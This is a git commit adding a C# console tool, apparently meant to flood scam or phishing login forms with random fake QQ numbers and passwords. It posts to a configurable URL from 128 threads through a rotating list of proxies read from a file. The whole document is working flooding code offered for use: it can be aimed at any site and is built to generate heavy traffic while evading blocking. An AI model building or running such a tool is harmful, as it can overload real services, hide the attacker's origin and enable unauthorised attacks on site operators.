928cc37ad40d93c737d7f7202b2b23a742991523
Inspiration (VM) <1351458095@qq.com>
2019-07-24 17:40:42 +0800

    Initial commit

---
+++ HackerBomberManager.cs
@@ -0,0 +1,298 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Text;
+using System.Threading;
+using System.Web;
+
+namespace 专治骗子
+{
+    public class BomberPerformer {
+        public event EventHandler<EventArgs> OnBombSuccess;
+        private int mSuccessCount = 0;
+        private int mThreadCount = 16;
+        public int ThreadCount {
+            get { return mThreadCount; }
+            set { mThreadCount = value; }
+        }
+        public int SuccessCount {
+            get {
+                return mSuccessCount;
+            }
+        }
+        private IBomber mBomber;
+        private bool isStarted = false;
+        private List<Thread> BomberThreads = new List<Thread>();
+        public BomberPerformer(IBomber bomber) {
+            mBomber = bomber;
+        }
+        public void StartBomber() {
+            new Thread(mStartBomber).Start();
+        }
+        private void mStartBomber() {
+            isStarted = true;
+            while (BomberThreads.Count < mThreadCount)
+            {
+                Thread t = new Thread(run);
+                Thread.Sleep(100);
+                BomberThreads.Add(t);
+                t.Start();
+            }
+        }
+        public void StopBomber() {
+            isStarted = false;
+            BomberThreads.Clear();
+        }
+        private void run() {
+            while (isStarted) {
+                if (mBomber.perform()) {
+                    mSuccessCount++;
+                    if (null != OnBombSuccess) {
+                        OnBombSuccess.Invoke(this,new EventArgs());
+                    }
+                }
+            }
+        }
+    }
+    public static class BomberUtils
+    {
+        public static event EventHandler<HttpRequestCreatedEventArgs> BeforeRequestSend;
+        public static long GetTimestamp()
+        {
+            TimeSpan ts = DateTime.Now.ToUniversalTime() - new DateTime(1970, 1, 1);
+            return (long)ts.TotalMilliseconds;
+        }
+        public static string DictionaryToHttpKeyValue(Dictionary<string, string> dic) {
+            StringBuilder builder = new StringBuilder();
+            int i = 0;
+            foreach (var item in dic)
+            {
+                if (i > 0)
+                    builder.Append("&");
+                builder.AppendFormat("{0}={1}", item.Key, item.Value);
+                i++;
+            }
+            return builder.ToString();
+        }
+        public static HttpWebRequest MakeHttpRequest(string url, string httpKeyValue, string method) {
+            if (method == "GET") {
+                return MakeHttpGet(url, httpKeyValue);
+            }
+            return MakeHttpPost(url, httpKeyValue);
+        }
+        public static HttpWebRequest MakeHttpGet(string url, string httpKeyValue)
+        {
+            string result = "";
+            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url + "?" + httpKeyValue);
+            req.Timeout = 5000;
+            req.Method = "GET";
+            req.AllowAutoRedirect = false;
+            if (null != BeforeRequestSend)
+            {
+                BeforeRequestSend.Invoke(req, new HttpRequestCreatedEventArgs(req));
+            }
+            return req;
+        }
+        public static HttpWebRequest MakeHttpPost(string url, string httpKeyValue)
+        {
+            string result = "";
+            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
+            req.Timeout = 5000;
+            req.Method = "POST";
+            req.ContentType = "application/x-www-form-urlencoded";
+            byte[] data = Encoding.UTF8.GetBytes(httpKeyValue);
+            req.ContentLength = data.Length;
+            req.AllowAutoRedirect = false;
+            if (null != BeforeRequestSend) {
+                BeforeRequestSend.Invoke(req, new HttpRequestCreatedEventArgs(req));
+            }
+            using (Stream reqStream = req.GetRequestStream())
+            {
+                reqStream.Write(data, 0, data.Length);
+                reqStream.Close();
+            }
+            return req;
+        }
+        public static string GetHttpResponse(HttpWebRequest req) {
+            string result = "";
+            HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
+            Stream stream = resp.GetResponseStream();
+            using (StreamReader reader = new StreamReader(stream, Encoding.UTF8))
+            {
+                result = reader.ReadToEnd();
+            }
+            return "["+resp.StatusCode.ToString()+"] " + result;
+        }
+        public static string GenerateRandomSequence(string charpool, int minlen, int maxlen)
+        {
+            StringBuilder sb = new StringBuilder();
+            Random rnd = new Random();
+            int len = minlen + (rnd.Next() % (maxlen - minlen + 1));
+            for (int i = 0; i < len; i++)
+            {
+                sb.Append(charpool[rnd.Next() % charpool.Length]);
+            }
+            return sb.ToString();
+        }
+        public static string RandomQQNumber() {
+            return GenerateRandomSequence("1234567890", 7, 10);
+        }
+        public static string RandomPassword() {
+            return GenerateRandomSequence("1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM！@#￥%……&*()_+-=[];',./<>?:\"{}\\`~", 6, 12);
+        }
+        public static string Base64Encode(string input) {
+            return Base64Encode(input, Encoding.Default);
+        }
+        public static string Base64Encode(string input, Encoding encoding) {
+            return Convert.ToBase64String(encoding.GetBytes(input));
+        }
+        private static object syncobj = new object();
+        public static void PrintResult(string user, string pass, string result)
+        {
+            lock (syncobj)
+            {
+                Console.WriteLine("USER=" + user);
+                Console.WriteLine("PASS=" + pass);
+                Console.WriteLine("Result: " + result);
+                Console.WriteLine("-------------------------------------------");
+            }
+        }
+        public static void startColorfulEffect()
+        {
+            System.Threading.Thread.Sleep(5000);
+            while (true)
+            {
+                System.Threading.Thread.Sleep(333);
+                Console.BackgroundColor = ConsoleColor.DarkBlue;
+                Console.Clear();
+                System.Threading.Thread.Sleep(333);
+                Console.BackgroundColor = ConsoleColor.DarkGreen;
+                Console.Clear();
+                System.Threading.Thread.Sleep(333);
+                Console.BackgroundColor = ConsoleColor.DarkRed;
+                Console.Clear();
+                System.Threading.Thread.Sleep(333);
+                Console.BackgroundColor = ConsoleColor.DarkYellow;
+                Console.Clear();
+            }
+        }
+        public static string UrlEncode(string raw) { return HttpUtility.UrlEncode(raw); }
+    }
+    public class HttpRequestCreatedEventArgs : EventArgs
+    {
+        private HttpWebRequest request;
+        public HttpWebRequest Request { get { return request; } }
+        public HttpRequestCreatedEventArgs(HttpWebRequest req) { this.request = req; }
+    }
+    public interface IBomber {
+        bool perform();
+    }
+    public abstract class IGeneralBomber : IBomber
+    {
+        public abstract string BaseUrl { get; }
+        public abstract string PassowordKey { get; }
+        public abstract string UserKey { get; }
+        public abstract string HttpMethod { get; }
+        public virtual string MakeRandomQQ() {
+            return BomberUtils.RandomQQNumber();
+        }
+        public virtual string MakeRandomPassowrd() {
+            return BomberUtils.RandomPassword();
+        }
+        public virtual Dictionary<string, string> MakeWebform(string user, string pass) {
+            Dictionary<string, string> dic = new Dictionary<string, string>();
+            dic.Add(UserKey,BomberUtils.UrlEncode(user));
+            dic.Add(PassowordKey, BomberUtils.UrlEncode(pass));
+            return dic;
+        }
+        public virtual string MakeHttpKeyValue(Dictionary<string, string> dic) {
+            return BomberUtils.DictionaryToHttpKeyValue(dic);
+        }
+        public virtual HttpWebRequest CreateRequest(string httpKeyValue) {
+            return BomberUtils.MakeHttpRequest(BaseUrl, httpKeyValue, HttpMethod);
+        }
+        public virtual bool perform()
+        {
+            string user = MakeRandomQQ();
+            string pass = MakeRandomPassowrd();
+            Dictionary<string, string> form = MakeWebform(user,pass);
+            string httpkeyvalue = MakeHttpKeyValue(form);
+            string result = "";
+            bool success = false;
+            try
+            {
+                HttpWebRequest request = CreateRequest(httpkeyvalue);
+                result = BomberUtils.GetHttpResponse(request);
+                success = true;
+            }
+            catch (Exception ex) {
+                result = ex.Message;
+            }
+            printResult(user, pass, result);
+            return success;
+        }
+        public virtual void printResult(string user, string pass, string result) {
+            BomberUtils.PrintResult(user, pass, result);
+        }
+    } 
+    public class GeneralBomber : IGeneralBomber
+    {
+        public GeneralBomber(string baseUrl,string userKey,string passKey,string httpMethod) {
+            this.mBaseUrl = baseUrl;
+            this.mUserKey = userKey;
+            this.mPassKey = passKey;
+            this.mHttpMethod = httpMethod;
+        }
+        public GeneralBomber(string baseUrl, string userKey, string passKey, string httpMethod,params KeyValuePair<string,string>[] additionalKeyValue)
+        {
+            this.mBaseUrl = baseUrl;
+            this.mUserKey = userKey;
+            this.mPassKey = passKey;
+            this.mHttpMethod = httpMethod;
+            foreach (KeyValuePair<string, string> kvs in additionalKeyValue)
+            {
+                AdditionalKeyValue.Add(kvs.Key, kvs.Value);
+            }
+        }
+        private string mBaseUrl, mUserKey, mPassKey, mHttpMethod;
+        private Dictionary<string, string> AdditionalKeyValue = new Dictionary<string, string>();
+        public override string BaseUrl
+        {
+            get
+            {
+                return mBaseUrl;
+            }
+        }
+        public override string HttpMethod
+        {
+            get
+            {
+                return mHttpMethod;
+            }
+        }
+        public override string PassowordKey
+        {
+            get
+            {
+                return mPassKey;
+            }
+        }
+        public override string UserKey
+        {
+            get
+            {
+                return mUserKey;
+            }
+        }
+        public override Dictionary<string, string> MakeWebform(string user, string pass)
+        {
+            Dictionary<string,string> based = base.MakeWebform(user, pass);
+            foreach (KeyValuePair<string, string> kvs in AdditionalKeyValue) {
+                based.Add(kvs.Key, kvs.Value);
+            }
+            return based;
+        }
+    }
+}
---
+++ Program.cs
@@ -0,0 +1,64 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Text;
+
+namespace 专治骗子
+{
+    class Program
+    {
+        static List<WebProxy> httpProxy = new List<WebProxy>();
+        
+        static int count = 0;
+        static void Main(string[] args)
+        {
+            loadProxyList();//加载代理列表
+            GeneralBomber bomber = new GeneralBomber(//配置轰炸参数
+                baseUrl:"http://www.sample.com/test.php",
+                userKey:"keysample",
+                passKey:"valuesample",
+                httpMethod:"POST",
+                additionalKeyValue:new KeyValuePair<string,string>("otherkey", "othercontent"));
+            BomberPerformer performer = new BomberPerformer(bomber);//创建轰炸实例
+            performer.ThreadCount = 128;//128线程
+            performer.OnBombSuccess += Performer_OnBombSuccess;//当请求成功时的事件
+            BomberUtils.BeforeRequestSend += BomberUtils_BeforeRequestSend;//在发送请求之前的事件,用于对请求进一步修改如添加代理,添加UA
+            performer.StartBomber();//开炸
+        }
+        static int ProxyPtr = 0;
+        static object syncobj = new object();
+        private static void BomberUtils_BeforeRequestSend(object sender, HttpRequestCreatedEventArgs e)
+        {
+            lock(syncobj){
+                if (httpProxy.Count < 1) { return; }
+                try
+                {
+                    e.Request.Proxy = httpProxy[ProxyPtr];
+                }
+                catch { }
+                ProxyPtr++;
+                if (ProxyPtr >= httpProxy.Count) { ProxyPtr = 0; }
+            }
+        }
+
+        private static void Performer_OnBombSuccess(object sender, EventArgs e)
+        {
+            count++;
+            Console.Title = count.ToString();
+        }
+
+        static public void loadProxyList() {
+            Console.WriteLine("加载代理中");
+            string[] proxies = File.ReadAllLines("proxies.txt");
+            foreach (string proxy in proxies)
+            {
+                string[] list = proxy.Split('\t',':');
+                if (list.Length < 2) { continue; }
+                httpProxy.Add(new WebProxy("http://"+list[0]+":"+list[1]+"/"));
+            }
+            Console.WriteLine("加载了"+httpProxy.Count+"个代理");
+        }
+    }
+}
